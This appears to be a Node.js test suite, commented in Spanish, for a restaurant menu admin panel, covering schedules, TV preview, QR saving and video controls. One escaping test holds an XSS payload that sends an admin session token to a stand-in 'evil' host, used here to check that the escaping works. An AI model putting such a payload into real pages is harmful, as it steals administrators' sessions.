// Funciones que viven en el HTML del panel y en qr.js. No son módulos, así
// que se extraen del fuente y se evalúan: así se prueba el código que se
// despliega y no una copia que puede quedarse atrás.
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const PUBLIC = path.join(__dirname, '..', 'public');

// El panel era un solo index.html y desde el 15/09/2026 se está partiendo en
// archivos: panel.css, comun.js y uno por pestaña. Esto los junta todos, en el
// orden en que el navegador los pide —marcado, estilos y scripts—, para las
// pruebas que leen el código como texto.
//
// Las comprobaciones NEGATIVAS («nadie escribe var(--warning)») tienen que
// usar esto y no un archivo suelto: contra index.html solo, pasarían siempre en
// cuanto el código que vigilan se mudara a otro archivo, sin que nada avisara.
const codigoDelPanel = () => [
	'index.html', 'panel.css',
	...fs.readdirSync(PUBLIC).filter(a => a.endsWith('.js')).sort(),
].map(a => fs.readFileSync(path.join(PUBLIC, a), 'utf8')).join('\n');

// Extrae el trozo de fuente entre dos marcas y lo evalúa en un contexto con
// los stubs que necesite.
//
// 'desde' admite también una lista de pares [desde, hasta] cuando lo que se
// prueba se apoya en un ayudante que vive en otra parte del archivo. Se
// evalúan todos en el MISMO contexto, en el orden dado, porque si no la
// función bajo prueba llamaría a algo que no existe. Se prefiere esto a
// copiar el ayudante al test: una copia se queda atrás sin avisar y entonces
// la prueba pasa contra código que ya no se despliega.
//
// Un par puede llevar delante su propio archivo —['tv.js', 'const X', null]—
// para juntar en un mismo contexto trozos de varios archivos del panel, que en
// el navegador comparten las declaraciones de nivel superior.
function cargar(archivo, desde, hasta, contexto = {}) {
	const pares = Array.isArray(desde) ? desde : [[desde, hasta]];
	const ctx = vm.createContext(Array.isArray(desde) ? (hasta || {}) : contexto);

	for (const par of pares) {
		const [de, ini, fin] = par.length === 3 ? par : [archivo, ...par];
		const src = fs.readFileSync(path.join(PUBLIC, de), 'utf8');
		const i = src.indexOf(ini);
		assert.notEqual(i, -1, `no se encontró "${ini}" en ${de} — ¿se renombró?`);
		const f = fin ? src.indexOf(fin, i) : src.length;
		// Sin esto, una marca de fin que ya no está —porque su código se movió a
		// otro archivo— daba -1, y slice(i, -1) cargaba el archivo casi entero sin
		// avisar. Pasó a ser un riesgo real al partir index.html en archivos.
		assert.notEqual(f, -1, `no se encontró "${fin}" después de "${ini}" en ${de} — ¿se movió?`);
		vm.runInContext(src.slice(i, f), ctx);
	}
	return ctx;
}

// ═══════════════════════════════════════════════════════════════
describe('la programación · el mismo juego de casos que el menú y el televisor', () => {
	// La regla vive en TRES sitios y ninguno puede importar a los otros: el menú
	// (core/horarios.js), la cartelera (una copia en dialecto viejo dentro de
	// tv.html, porque un televisor de 2017 no entiende la sintaxis moderna) y
	// este espejo del panel, que es el que dice "ahora mismo sí está saliendo".
	//
	// Tres copias que discrepan solo se notan los martes, que es cuando peor se
	// encuentra el fallo. Este archivo —duplicado a propósito en los dos
	// repositorios— es lo único que impide que se separen.
	const CASOS = JSON.parse(
		fs.readFileSync(path.join(__dirname, 'casos-programacion.json'), 'utf8'));

	const regla = () => cargar('index.html',
		[['function zonaRestaurante', 'function describirHorario']],
		{ state: {}, Intl, Date, RegExp, String, Array, parseInt });

	for (const c of CASOS.casos) {
		test(c.nombre, () => {
			assert.equal(
				regla().vigenteAhora(c.programacion, CASOS.zona, new Date(c.momento)),
				c.esperado);
		});
	}

	test('el archivo de casos no se ha quedado vacío', () => {
		// Una lista vacía haría pasar todo lo de arriba sin probar nada.
		assert.ok(CASOS.casos.length >= 20, `solo hay ${CASOS.casos.length} casos`);
	});

	test('la zona se calcula de verdad, no se cae al reloj de la máquina', () => {
		// Se pregunta por MADRID a propósito. Con Bogotá, una máquina que ya está
		// en hora de Colombia da la respuesta correcta aunque el cálculo de zona
		// NO se esté ejecutando, y la prueba pasa en verde sin probar nada. Eso
		// ocurrió de verdad en el otro repositorio: verde en local, rojo en CI.
		const r = regla().ahoraEnZona('Europe/Madrid', new Date('2026-09-08T23:30:00-05:00'));
		assert.equal(r.dia, 3, 'en Madrid ya es miércoles');
		assert.equal(r.minutos, 6 * 60 + 30);
		assert.equal(r.fecha, '2026-09-09');
	});

	test('declarar algo no es estar vigente', () => {
		// Unos martes SÍ tienen programación un jueves, aunque ese jueves no
		// salgan. De esa diferencia depende la regla de dos niveles.
		const { tieneProgramacion } = regla();
		assert.equal(tieneProgramacion({}), false);
		assert.equal(tieneProgramacion({ activo: true }), false);
		assert.equal(tieneProgramacion({ activo: true, dias: [2] }), true);
		assert.equal(tieneProgramacion({ activo: true, desde_fecha: '2026-12-01' }), true);
		assert.equal(tieneProgramacion({ activo: false, dias: [2] }), false);
	});

	test('unos martes sin horas siguen siendo solo los martes', () => {
		// Antes esto devolvía true y se saltaba los días, así que habría salido
		// toda la semana. Comprobado que ninguna categoría en producción tenía
		// horario activo antes de cambiarlo.
		const { vigenteAhora } = regla();
		const soloDias = { activo: true, dias: [2] };
		assert.equal(vigenteAhora(soloDias, 'America/Bogota', new Date('2026-09-08T19:00:00-05:00')), true);
		assert.equal(vigenteAhora(soloDias, 'America/Bogota', new Date('2026-09-09T19:00:00-05:00')), false);
	});
});

describe('la vista previa de la cartelera', () => {
	// Es la cartelera de VERDAD embebida, no una imitación. Una imitación
	// tendría que reproducir el ciclo, las animaciones, la rotación de
	// intercalados y los colores, y el día que cualquiera de esas cosas
	// cambiara en tv.html mentiría sin que nadie lo notara.
	const montar = (orientacion = 'horizontal', enlace = 'https://menu.vmenus.co/bonzas/tv') => {
		const campos = {
			tvOrientacion: { value: orientacion },
			tvEnlace:      { value: enlace },
			tvPrevia:      { style: {}, src: '' },
			tvPreviaCaja:  { style: {} },
			tvPreviaMarco: { style: { display: 'none' } },
			btnVistaPrevia:   { textContent: '' },
			btnRecargarPrevia:{ style: {} },
		};
		const ctx = cargar('tv.js',
			[['const TV_ANCHO_PREVIA', 'async function saveTV']],
			{ document: { getElementById: id => campos[id] }, Math, Date, Number });
		return { ctx, campos };
	};

	test('apaisada usa las proporciones de un televisor', () => {
		const { ctx } = montar('horizontal');
		const m = ctx.tvMedidasDePrevia();
		assert.equal(m.w, 1280);
		assert.equal(m.h, 720);
	});

	test('vertical las invierte y se limita por altura', () => {
		// Con 560 de ancho, una vertical daría casi mil de alto y empujaría el
		// resto del formulario fuera de la pantalla.
		const { ctx } = montar('vertical');
		const m = ctx.tvMedidasDePrevia();
		assert.equal(m.w, 720);
		assert.equal(m.h, 1280);
		assert.ok(m.h * m.escala <= 420, 'no pasa de 420 px de alto');
	});

	test('la caja se queda con el tamaño ya encogido', () => {
		// El iframe sigue midiendo 720 px para el diseño aunque se vea a 315:
		// sin fijar la caja, quedaría un hueco enorme debajo.
		const { ctx, campos } = montar('horizontal');
		ctx.tvPintarMedidasDePrevia();
		assert.equal(campos.tvPrevia.style.width, '1280px');
		assert.equal(campos.tvPreviaCaja.style.height, '315px');
	});

	test('recargar fuerza una carga nueva, no repite el mismo src', () => {
		// Asignar el mismo valor a src no vuelve a pedir nada, y la vista previa
		// se quedaría con la configuración anterior justo después de guardar.
		const { ctx, campos } = montar();
		campos.tvPreviaMarco.style.display = 'block';
		ctx.tvRecargarVistaPrevia();
		assert.match(campos.tvPrevia.src, /^https:\/\/menu\.vmenus\.co\/bonzas\/tv\?v=\d+$/);
	});

	test('con la vista previa cerrada no se carga nada', () => {
		const { ctx, campos } = montar();
		ctx.tvRecargarVistaPrevia();
		assert.equal(campos.tvPrevia.src, '');
	});

	test('cerrarla VACÍA el iframe, no lo esconde', () => {
		// Escondido seguiría rotando, pidiendo fotos y sondeando Supabase cada
		// cinco minutos detrás de una pestaña que nadie mira.
		const { ctx, campos } = montar();
		ctx.tvAlternarVistaPrevia();                       // abrir
		assert.match(campos.tvPrevia.src, /menu\.vmenus\.co/);
		ctx.tvAlternarVistaPrevia();                       // cerrar
		assert.equal(campos.tvPrevia.src, 'about:blank');
		assert.equal(campos.tvPreviaMarco.style.display, 'none');
	});

	test('sin enlace todavía no intenta cargar', () => {
		const { ctx, campos } = montar('horizontal', '');
		campos.tvPreviaMarco.style.display = 'block';
		ctx.tvRecargarVistaPrevia();
		assert.equal(campos.tvPrevia.src, '');
	});
});

describe('el televisor solo se ofrece a quien puede tenerlo', () => {
	// perroscriollos no tiene cartelera —su plan no la incluye— y aun así la
	// tarjeta de promoción le ofrecía un interruptor «En el televisor». Un
	// control que promete algo que el plan no incluye confunde y no lleva a
	// ninguna parte. Es el mismo patrón que ya apareció con la pantalla de marca.
	const conPlan = (plan, atributos = {}) => cargar('index.html',
		[['const PLANES', 'function planActual() {'],
		 	['function planActual() {', '// ── MODELOS QUE PINTAN VIDEO'],
		 	['function restauranteTieneTv', '// Qué modelo se guarda']],
		{ state: { restaurante: { atributos: { plan, ...atributos } } } });

	test('un plan sin cartelera no la ofrece', () => {
		assert.equal(conPlan('pedidos').restauranteTieneTv(), false);
	});

	test('sin plan asignado tampoco', () => {
		// Es el caso de perroscriollos: cae en el plan por defecto.
		assert.equal(conPlan(undefined).restauranteTieneTv(), false);
	});

	test('un plan con cartelera sí', () => {
		assert.equal(conPlan('completo').restauranteTieneTv(), true);
		assert.equal(conPlan('video').restauranteTieneTv(), true);
	});

	test('y una cartelera ya configurada la ofrece aunque el plan baje', () => {
		// Si no, un cambio de plan dejaría una pantalla encendida en la pared de
		// un local sin forma de apagarla desde el panel.
		assert.equal(conPlan('pedidos', { tv: { activa: true } }).restauranteTieneTv(), true);
	});
});

describe('la hora de las promociones · selector y 24 horas', () => {
	// <input type="time"> no sirve para esto: el formato lo decide el sistema
	// operativo del visitante, no la página. Comprobado en navegador el
	// 05/09/2026 con lang="es-CO", "es-ES" y "en-GB" en el propio input — los
	// tres pintan "06:30 p. m.".
	//
	// Un <select> es a la vez selector (no hay que teclear) y 24 h en cualquier
	// aparato, porque las etiquetas las escribimos nosotros.
	const horas = () => cargar('index.html',
		[['const PASO_HORA', 'function abrirCalendarioAlPulsar']],
		{ document: domDeSelect(), Math, String, Array });

	function domDeSelect() {
		return {
			createElement: () => ({
				className: '', value: '', textContent: '', hijos: [],
				appendChild(h) { this.hijos.push(h); return h; },
			}),
		};
	}

	test('media hora de resolución, de 00:00 a 23:30', () => {
		const o = horas().opcionesDeHora();
		assert.equal(o.length, 48);
		assert.equal(o[0], '00:00');
		assert.equal(o[1], '00:30');
		assert.equal(o[o.length - 1], '23:30');
	});

	test('todas van en 24 h, sin a. m. ni p. m.', () => {
		// Es el punto entero del cambio: mucha gente duda si las doce del
		// mediodía son 12 a. m. o 12 p. m.
		const o = horas().opcionesDeHora();
		assert.ok(o.every(h => /^\d{2}:\d{2}$/.test(h)), 'formato HH:MM');
		assert.ok(o.includes('12:00'), 'el mediodía es 12:00');
		assert.ok(o.includes('00:00'), 'y la medianoche 00:00');
		assert.ok(o.includes('18:00'), 'las 6 de la tarde son 18:00');
	});

	test('la primera opción significa "todo el día"', () => {
		// Contesta en el propio control la duda de marcar días sin marcar horas.
		const sel = horas().selectorDeHora('p-desde', '');
		assert.equal(sel.hijos[0].value, '');
		assert.equal(sel.hijos[0].textContent, 'Todo el día');
	});

	test('una hora guardada fuera de la rejilla no desaparece', () => {
		// Si no estuviera, abrir la ficha y guardar sin tocar nada le cambiaría
		// el horario al restaurante sin que nadie lo pidiera.
		const sel = horas().selectorDeHora('p-desde', '18:45');
		assert.ok(sel.hijos.some(o => o.value === '18:45'), '18:45 sigue en la lista');
	});
});

describe('la nota del horario de categoría', () => {
	// El editor de categorías decía "completa las dos horas: vacías o iguales,
	// la categoría se verá siempre". Dejó de ser verdad al unificar la regla del
	// horario en tv.html y core/horarios.js: sin franja válida mandan los días
	// solos. La nota pedía rellenar algo que no hace falta y prometía un
	// comportamiento que ya no ocurre.
	const montar = (dias, desde, hasta) => {
		const campos = {
			editCatHorarioNota: { textContent: '', innerHTML: '', style: {} },
			editCatDesde: { value: desde },
			editCatHasta: { value: hasta },
		};
		const ctx = cargar('index.html', [
			// Hasta 'let catDiasSel' y no más allá: un 'let' dentro de un vm no se
			// puede pisar desde el contexto, así que si entrara aquí la prueba no
			// podría elegir los días.
			['const DIAS_CORTOS', 'let catDiasSel'],
			['function zonaRestaurante', 'function describirHorario'],
			['function describirHorario', 'function renderCatDiasChips'],
			['function renderCatHorarioNota', 'function cargarCatHorario'],
		], {
			document: { getElementById: id => campos[id] },
			state: {}, Intl, Date, RegExp, String, Array, parseInt, Set,
		});
		ctx.catDiasSel = new Set(dias);
		ctx.renderCatHorarioNota();
		return campos.editCatHorarioNota;
	};

	test('ya no pide rellenar horas que no hacen falta', () => {
		const nota = montar([1,3,5], '', '');
		assert.doesNotMatch(nota.innerHTML + nota.textContent, /Completa las dos horas/);
	});

	test('unos días sin horas se describen como el día entero', () => {
		const nota = montar([1,3,5], '', '');
		assert.match(nota.innerHTML, /L X V · todo el día/);
		assert.match(nota.innerHTML, /de una medianoche a la siguiente/);
	});

	test('con franja se describe la franja, sin esa coletilla', () => {
		const nota = montar([1,3,5], '11:00', '15:00');
		assert.match(nota.innerHTML, /11:00–15:00/);
		assert.doesNotMatch(nota.innerHTML, /de una medianoche a la siguiente/);
	});

	test('sin ningún día sí avisa, porque eso sí lo hace ver siempre', () => {
		const nota = montar([], '11:00', '15:00');
		assert.match(nota.textContent, /Elige al menos un día/);
	});

	test('la franja que cruza medianoche sigue explicándose', () => {
		const nota = montar([5], '18:00', '02:00');
		assert.match(nota.innerHTML, /cruza la medianoche/);
	});

	test('dice si ahora mismo se está viendo', () => {
		// Con los siete días y todo el día, la respuesta no depende de cuándo se
		// corra la prueba.
		const nota = montar([0,1,2,3,4,5,6], '', '');
		assert.match(nota.innerHTML, /Ahora mismo se está mostrando/);
	});
});

describe('describirHorario · unos días sin horas son el día entero', () => {
	// La duda que trajo el usuario: marcar lunes, miércoles y viernes sin poner
	// horas. Antes se leía "L X V · –", que no dice nada.
	const fn = () => cargar('index.html',
		[['function describirHorario', 'function renderCatDiasChips']],
		{ DIAS_CORTOS: ['D','L','M','X','J','V','S'], Array });

	test('sin franja lo dice con palabras', () => {
		assert.match(fn().describirHorario({ dias: [1,3,5] }), /L X V · todo el día/);
	});

	test('con franja la enseña', () => {
		assert.match(fn().describirHorario({ dias: [1,3,5], desde: '18:00', hasta: '23:00' }),
			/L X V · 18:00–23:00/);
	});

	test('sin días marcados son todos', () => {
		assert.match(fn().describirHorario({ desde: '18:00', hasta: '23:00' }),
			/Todos los días/);
	});
});

describe('programacionDelFormulario · lo que la tarjeta manda a guardar', () => {
	// La tarjeta de una promoción arma su programación desde sus propios campos.
	const caja = valores => ({
		querySelector: c => ({
			checked: valores[c.slice(1)] === true,
			value: typeof valores[c.slice(1)] === 'string' ? valores[c.slice(1)] : '',
		}),
	});
	const fn = () => cargar('promocion.js',
		[['function programacionDelFormulario', 'async function guardarPromo']], {});

	test('con el interruptor apagado no manda nada', () => {
		// Un objeto vacío es "de fondo, siempre vigente". Mandar días con el
		// interruptor apagado guardaría una programación que la tarjeta no enseña.
		const r = fn().programacionDelFormulario(caja({ 'p-prog': false }), new Set([2]));
		assert.deepEqual(Object.keys(r), []);
	});

	test('con el interruptor encendido manda las tres capas', () => {
		const r = fn().programacionDelFormulario(caja({
			'p-prog': true, 'p-desde': '18:00', 'p-hasta': '23:00',
			'p-desdef': '2026-12-01', 'p-hastaf': '2026-12-24',
		}), new Set([2, 5]));
		assert.equal(r.activo, true);
		assert.equal(r.dias.join(','), '2,5');
		assert.equal(r.desde, '18:00');
		assert.equal(r.hasta_fecha, '2026-12-24');
	});

	test('encendido y sin nada marcado se guarda como sin programación', () => {
		// Guardar 'activo:true' con todo vacío deja una fila que promete una
		// programación que no existe — y la regla de dos niveles la leería como
		// "programada", quitándole el turno a las de fondo sin motivo. Se
		// comporta igual (sale siempre), así que se guarda como tal.
		const ctx = cargar('index.html',
			[['promocion.js', 'function programacionDelFormulario', 'async function guardarPromo'],
			 ['function zonaRestaurante', 'function describirHorario']],
			{ state: {}, Intl, Date, RegExp, String, Array, parseInt });
		const r = ctx.programacionParaGuardar(caja({ 'p-prog': true }), new Set());
		assert.deepEqual(Object.keys(r), []);
	});

	test('pero con un solo día sí se guarda entera', () => {
		const ctx = cargar('index.html',
			[['promocion.js', 'function programacionDelFormulario', 'async function guardarPromo'],
			 ['function zonaRestaurante', 'function describirHorario']],
			{ state: {}, Intl, Date, RegExp, String, Array, parseInt });
		const r = ctx.programacionParaGuardar(caja({ 'p-prog': true }), new Set([2]));
		assert.equal(r.activo, true);
		assert.equal(r.dias.join(','), '2');
	});

	test('los días salen ordenados', () => {
		// Un Set no promete orden, y el orden acaba guardado en la base.
		const r = fn().programacionDelFormulario(caja({ 'p-prog': true }), new Set([5, 0, 2]));
		assert.equal(r.dias.join(','), '0,2,5');
	});
});

describe('hex6 · normaliza colores para el selector nativo', () => {
	const { hex6 } = cargar('index.html', 'function hex6', '// El cuadrito y el campo');

	test('expande los hex de tres dígitos', () => {
		// <input type="color"> solo admite #rrggbb: un #abc lo dejaría en
		// negro y el cuadrito no coincidiría con lo escrito.
		assert.equal(hex6('#abc'), '#aabbcc');
		assert.equal(hex6('#AABBCC'), '#aabbcc');
	});

	test('acepta las formas razonables de escribir un color', () => {
		assert.equal(hex6('#ffd521'), '#ffd521');
		assert.equal(hex6('ffd521'), '#ffd521', 'sin almohadilla');
		assert.equal(hex6('  #ffd521  '), '#ffd521', 'con espacios');
	});

	test('lo inválido conserva el valor anterior, no salta a negro', () => {
		// Si saltara a negro, el diseño se movería solo mientras alguien
		// termina de teclear el color.
		for (const malo of ['#12345', 'rojo', '', null, undefined, '#zzzzzz'])
			assert.equal(hex6(malo, '#e91e63'), '#e91e63', `con ${JSON.stringify(malo)}`);
	});

	test('los colores que la plataforma usa hoy pasan intactos', () => {
		for (const c of ['#ffd521', '#f5a623', '#cdfefe', '#a374af', '#3d568c',
		                 '#3dd68c', '#12111a', '#1a1825', '#0a0a0f', '#000000', '#ffffff'])
			assert.equal(hex6(c), c);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('esc · escapado en el panel', () => {
	const { esc } = cargar('comun.js', 'function esc(s)', '// ── SESIÓN Y ESTADO');

	test('el nombre de un producto no puede inyectar código', () => {
		// Importa más que en el menú público: el superadmin abre el panel de
		// CUALQUIER restaurante y su sesión vive en sessionStorage.
		const payload = '<img src=x onerror="fetch(\'//evil/\'+sessionStorage.menuAdminToken)">';
		const salida = esc(payload);
		assert.ok(!/<[a-zA-Z]/.test(salida), 'no debe quedar ninguna etiqueta');
		assert.ok(!salida.includes('"'), 'no debe quedar comilla que abra un atributo');
	});

	test('un nombre normal se muestra igual', () => {
		assert.equal(esc('HAMBURGUESA'), 'HAMBURGUESA');
		assert.equal(esc("PA' QUE NO JODA"), 'PA&#39; QUE NO JODA');
	});

	test('nulo no imprime la palabra "null"', () => {
		assert.equal(esc(null), '');
		assert.equal(esc(undefined), '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('qrGuardarDiseno · guardar el QR no puede pisar el resto', () => {
	// 'atributos' es un solo JSON compartido por siete pantallas que no se
	// conocen entre sí. El 27/08/2026 se cambiaron las cinco de index.html
	// para que cada una mandara SOLO sus claves y las fundiera el servidor,
	// que sí tiene la versión de ahora. Esta se quedó fuera por vivir en otro
	// archivo, y siguió mandando el objeto entero desde la copia que el panel
	// cargó al entrar.
	//
	// El caso concreto: el superadmin abre el diseñador de QR a las 10:00, el
	// dueño cambia su WhatsApp de pedidos a las 10:05, el superadmin guarda el
	// QR a las 10:10 — y el WhatsApp vuelve al de las 10:00.
	const guardar = async () => {
		const enviado = [];
		const ctx = cargar('qr.js', 'async function qrGuardarDiseno', null, {
			qrCfg: { fg: '#000000', punto: 'redondo' },
			qrLeerControles: () => {},
			document: { getElementById: () => ({ textContent: '', style: {} }) },
			showToast: () => {},
			state: {
				restaurante: {
					id: 'r1',
					// Lo que el panel cargó al entrar y ya está viejo.
					atributos: { whatsapp_pedidos: '573001112233', nav: 'carrito', qr: { fg: '#ffffff' } },
				},
			},
			apiFetch: async (metodo, ruta, cuerpo) => { enviado.push({ metodo, ruta, cuerpo }); return { id: 'r1' }; },
		});
		await ctx.qrGuardarDiseno();
		return enviado[0];
	};

	test('manda SOLO la clave qr', async () => {
		const { cuerpo } = await guardar();
		assert.deepEqual(Object.keys(cuerpo.atributos), ['qr'],
			'cualquier otra clave arrastra un valor viejo encima del de ahora');
	});

	test('no reenvía el WhatsApp de pedidos que cargó al entrar', async () => {
		// La clave concreta que más duele: es a dónde llega el dinero.
		const { cuerpo } = await guardar();
		assert.equal(cuerpo.atributos.whatsapp_pedidos, undefined);
		assert.equal(cuerpo.atributos.nav, undefined);
	});

	test('el diseño sí viaja entero', async () => {
		const { cuerpo, metodo } = await guardar();
		assert.equal(metodo, 'PATCH');
		assert.equal(cuerpo.atributos.qr.punto, 'redondo', 'lo que se acaba de elegir');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Diseñador de QR · avisos de escaneabilidad', () => {
	// qrRevisarAvisos y qrLeerControles leen del DOM; se les da uno falso.
	function preparar(cfgPrevia, entradas) {
		const campos = {
			qrColorFg:   { value: entradas.fg ?? '#000000' },
			qrColorOjos: { value: entradas.ojos ?? '' },
			qrColorBg:   { value: entradas.bg ?? '#ffffff' },
			qrCartelBg:  { value: '#111111' },
			qrCartelFg:  { value: '#ffffff' },
			qrTransparente: { checked: false },
			qrUsarLogo:  { checked: false },
			qrLogoTam:   { value: '22' },
			qrMargen:    { value: String(entradas.margen ?? 4) },
			qrCartelTitulo: { value: '' },
			qrCartelPie: { value: '' },
			qrAviso:     { textContent: '', style: {} },
		};
		const ctx = cargar('qr.js', 'const QR_HEX_RE', 'function qrElegirEstilo', {
			qrCfg: { ...cfgPrevia },
			document: { getElementById: id => campos[id] || null },
		});
		ctx.qrLeerControles();
		ctx.qrRevisarAvisos();
		return { aviso: campos.qrAviso.textContent, cfg: ctx.qrCfg };
	}

	test('un color mal escrito avisa y conserva el anterior', () => {
		// Canvas ignora en silencio un fillStyle inválido y se queda con el
		// del fondo: el QR salía en blanco sin que nada lo dijera.
		const { aviso, cfg } = preparar({ fg: '#e91e63', bg: '#ffffff' }, { fg: '#12345' });
		assert.match(aviso, /Color no válido/);
		assert.equal(cfg.fg, '#e91e63', 'no se pierde el color que ya funcionaba');
	});

	test('nombra los campos concretos que están mal', () => {
		const { aviso } = preparar({ fg: '#000000', bg: '#ffffff' }, { fg: 'rojo', bg: 'blanco' });
		assert.match(aviso, /los puntos y el fondo/);
	});

	test('los formatos válidos no se marcan como inválidos', () => {
		// Ojo: #abc es #aabbcc, un azul claro que sobre blanco sí dispara el
		// aviso de contraste. Eso es correcto; aquí solo interesa que no se
		// le acuse de estar mal escrito.
		for (const [entradas, etiqueta] of [
			[{ fg: '#abc' }, 'hex de 3 dígitos'],
			[{ fg: '#AABBCC' }, 'mayúsculas'],
			[{ ojos: '' }, 'esquinas vacío = igual que los puntos'],
			[{ fg: '#000000' }, 'hex completo'],
		]) assert.doesNotMatch(preparar({}, entradas).aviso, /Color no válido/, etiqueta);
	});

	test('un margen por debajo de la norma avisa', () => {
		// La norma del QR pide 4 módulos de zona de silencio; con menos,
		// muchos lectores fallan impreso junto a otros elementos.
		assert.match(preparar({}, { margen: 0 }).aviso, /Margen de 0 módulos/);
		assert.match(preparar({}, { margen: 1 }).aviso, /Margen de 1 módulo\b/, 'singular');
		assert.doesNotMatch(preparar({}, { margen: 4 }).aviso, /Margen/);
		assert.doesNotMatch(preparar({}, { margen: 8 }).aviso, /Margen/);
	});

	test('el aviso de contraste sigue funcionando', () => {
		assert.match(preparar({}, { fg: '#ffffff', bg: '#000000' }).aviso, /claro sobre fondo oscuro/);
		assert.match(preparar({}, { fg: '#777777', bg: '#888888' }).aviso, /poco contraste/);
		assert.equal(preparar({}, { fg: '#000000', bg: '#ffffff', margen: 4 }).aviso, '', 'negro sobre blanco, sin avisos');
	});

	test('varios problemas se listan juntos, no se pisan', () => {
		const { aviso } = preparar({ fg: '#000000' }, { fg: '###', margen: 0 });
		assert.ok(aviso.split('\n').length >= 2, 'debe verlos todos de una vez');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('pintarVideoPlato · la subida de video depende del plan', () => {
	// Esconder el grupo no es la seguridad —esa vive en POST /api/video—,
	// pero sí es lo que evita ofrecerle a un restaurante algo que no ha
	// contratado y que la API le va a rechazar.
	const pantalla = () => {
		const ids = ['videoGroup', 'videoEditPreview', 'videoEditVacio',
			'btnSubirVideo', 'btnQuitarVideo', 'videoUploadStatus', 'videoFileInput',
			'videoDesdeFila', 'btnConfirmarVideo', 'videoDesde', 'videoDesdeAviso',
				'videoFallido', 'videoFallidoMotivo',
				// El bloque de revisión de lo que generó el modelo.
				'iaRevision', 'iaRevisionVideo', 'iaRevisionEstado',
				'btnPublicarIA', 'btnDescartarIA',
				// El aviso de "este video quedó en el formato anterior".
				'videoDesfasado', 'videoDesfasadoTexto', 'videoDesfasadoEstado', 'btnReconvertir',
				// La vuelta de un video retirado.
				'videoRetirado', 'videoRetiradoEstado', 'btnRecuperarVideo'];
		const mapa = {};
		for (const id of ids) mapa[id] = {
			style: {}, textContent: '', value: '', disabled: false,
			removeAttribute(n) { delete this[n === 'poster' ? 'poster' : 'src']; },
			load() {},
		};
		return mapa;
	};

	const pintar = (videos, plato, mapa, trabajos = [], porAprobar = [], nav = 'video') => {
		// Dos trozos, en este orden: videoDesfasadoDe() pregunta por
		// formatoDeLaCarta(), que vive arriba con el resto de lo que sabe de
		// modelos. Se carga el ayudante de verdad en vez de un doble para que
		// esta prueba siga midiendo la regla que se despliega.
		const ctx = cargar('index.html', [
			['function formatoDeLaCarta', 'function idPlanActual'],
			['// Los trabajos de conversión del restaurante.', '// Elegir el archivo ya no lo sube'],
		], {
				clearInterval() {},
				planActual: () => ({ videos }),
				state: { trabajosVideo: trabajos, videosPorAprobar: porAprobar,
				         restaurante: { atributos: { nav } } },
				document: { getElementById: id => mapa[id] },
			});
		ctx.pintarVideoPlato(plato);
		return mapa;
	};

	test('un plan sin video no enseña la subida', () => {
		const m = pintar(false, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'none');
	});

	test('el plan de video sí la enseña', () => {
		const m = pintar(true, { id: 'p1' }, pantalla());
		assert.equal(m.videoGroup.style.display, 'block');
	});

	test('un plato sin guardar no puede recibir video todavía', () => {
		// El video se cuelga de un producto_id que aún no existe. Dejar el
		// botón vivo mandaría la subida a un 400 sin explicar por qué.
		const m = pintar(true, null, pantalla());
		assert.equal(m.btnSubirVideo.disabled, true);
		assert.match(m.videoEditVacio.textContent, /Guarda el plato primero/);
	});

	test('un plato con video ya convertido lo muestra', () => {
		const url = 'https://ejemplo.test/uploads/videos/a.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla());
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.videoEditPreview.style.display, 'block');
		assert.equal(m.videoEditVacio.style.display, 'none');
	});

	// ── QUITAR SOLO SE OFRECE CUANDO HAY ALGO QUE QUITAR ──────
	// Es la mitad visible de una acción que hasta ahora no existía: 'video' lo
	// escribe la cola y atributosProducto() lo conserva siempre, así que un
	// plato con video no podía perderlo por ninguna vía del panel.
	//
	// El botón se ata al video YA PUESTO, no a haber elegido un archivo:
	// mientras se elige o se convierte, lo que se necesita es cancelar, y eso
	// es otra cosa que retirar lo que la carta ya está enseñando.

	test('sin video no se ofrece quitarlo', () => {
		const m = pintar(true, { id: 'p1' }, pantalla());
		assert.equal(m.btnQuitarVideo.style.display, 'none');
	});

	test('con video puesto sí', () => {
		const m = pintar(true, { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/uploads/videos/a.mp4' } } }, pantalla());
		assert.equal(m.btnQuitarVideo.style.display, 'block');
	});

	test('un plato sin guardar tampoco lo ofrece', () => {
		// No tiene id, así que no hay a qué ruta llamar.
		const m = pintar(true, null, pantalla());
		assert.equal(m.btnQuitarVideo.style.display, 'none');
	});

	// ── ABRIR OTRO PLATO DESHACE "HAY UN ARCHIVO A MEDIAS" ────
	// prepararVideoElegido pinta el botón de subir como principal y renombra
	// el de elegir a "Cambiar archivo". Sin deshacerlo, abrir otro plato
	// dejaba esa pinta sobre una ficha donde no hay nada que cambiar ni que
	// subir — y el botón principal, que es el que más llama, apuntando a nada.

	test('el botón de subir vuelve a su aspecto de reposo', () => {
		const m = pantalla();
		m.btnConfirmarVideo.style.background = 'var(--success)';
		pintar(true, { id: 'p1' }, m);

		assert.equal(m.btnConfirmarVideo.style.display, 'none');
		assert.equal(m.btnConfirmarVideo.style.background, 'transparent');
	});

	test('y el de elegir recupera su nombre', () => {
		const m = pantalla();
		m.btnSubirVideo.textContent = '🎬 Cambiar archivo';
		pintar(true, { id: 'p1' }, m);

		assert.match(m.btnSubirVideo.textContent, /Elegir video/);
	});

	// ── UN VIDEO RETIRADO TIENE QUE PODER VOLVER ──────────────
	// El aviso al quitar promete que el original se conserva y se puede volver
	// a poner. Eso era cierto en el servidor —la fila y el master siguen ahí—
	// y falso en el panel: el único botón que reconvierte colgaba del bloque
	// "formato anterior", que solo se pinta CUANDO HAY VIDEO. Al quitarlo
	// desaparecía, y la vuelta prometida no existía por ninguna parte.
	//
	// Se probó a mano y salió: por eso estas pruebas, que es lo que faltaba
	// para que no vuelva a salir.

	test('sin video pero con master, se ofrece volver a ponerlo', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), listo('horizontal'));
		assert.equal(m.videoRetirado.style.display, 'block');
	});

	test('con el video puesto NO se ofrece: no hay nada que recuperar', () => {
		const m = pintar(true, conVideo, pantalla(), listo('horizontal'));
		assert.equal(m.videoRetirado.style.display, 'none');
	});

